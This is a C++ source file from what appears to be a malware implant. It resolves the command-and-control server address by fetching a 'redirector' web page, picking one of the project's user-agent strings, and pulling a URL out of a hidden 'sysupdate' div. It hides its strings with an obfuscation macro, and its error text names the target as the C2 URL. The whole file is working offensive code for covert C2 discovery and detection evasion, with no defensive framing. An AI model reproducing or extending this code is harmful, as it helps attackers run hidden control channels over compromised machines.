#include "RedirectorResolver.h"
#include "HttpClient.h"
#include "../core/Config.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include <regex>
#include <stdexcept>
#include <cstdlib>

namespace http {
RedirectorResolver::RedirectorResolver(const std::string& redirectorUrl) : redirectorUrl_(redirectorUrl) {}
std::string RedirectorResolver::resolve() {
    std::string server, path;
    std::regex urlParseRegex(R"(https?://([^/]+)(/.*))");
    std::smatch urlMatch;
    if (std::regex_search(redirectorUrl_, urlMatch, urlParseRegex)) {
        server = urlMatch[1].str();
        path = urlMatch[2].str();
    } else throw std::runtime_error(OBF("Failed to parse redirector URL: ") + redirectorUrl_);

    std::string html;
    HttpClient client(core::USER_AGENTS[0]);
    html = client.get(server, path);

    if (getenv("CI")) {
        LOG_INFO("Redirector response body size: " + std::to_string(html.size()));
    }

    std::regex divRegex("id\\s*=\\s*[\"']sysupdate[\"'][^>]*>([\\s\\S]*?)</div>", std::regex::icase);
    std::smatch match;
    if (!std::regex_search(html, match, divRegex)) {
        if (getenv("CI")) LOG_ERR("sysupdate div not found in HTML. Body preview: " + html.substr(0, 100));
        throw std::runtime_error(OBF("C2 URL not found in redirector page."));
    }
    std::string content = match[1].str();
    std::regex urlRegex(OBF("https?://[^\\s\"'<>]+"));
    if (std::regex_search(content, match, urlRegex)) return match[0].str();
    throw std::runtime_error(OBF("No valid URL found in sysupdate div."));
}
}
